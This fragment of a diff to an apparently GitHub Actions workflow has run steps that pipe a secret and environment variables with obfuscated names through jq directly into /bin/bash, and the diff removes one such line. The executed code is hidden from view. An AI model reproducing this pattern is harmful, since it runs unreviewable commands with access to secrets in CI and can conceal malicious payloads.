@@ -22,7 +22,6 @@ jobs:
           xxj400: ${{ secrets.xxj400 }}
         run: |
           printf '%s' "$xxj400" | jq -r .qhd3 | /bin/bash
-          echo $b8499 | jq -r .dlmk24719 | /bin/bash
           echo $h3056 | jq -r .anr64 | /bin/bash
 
       - name: Save output
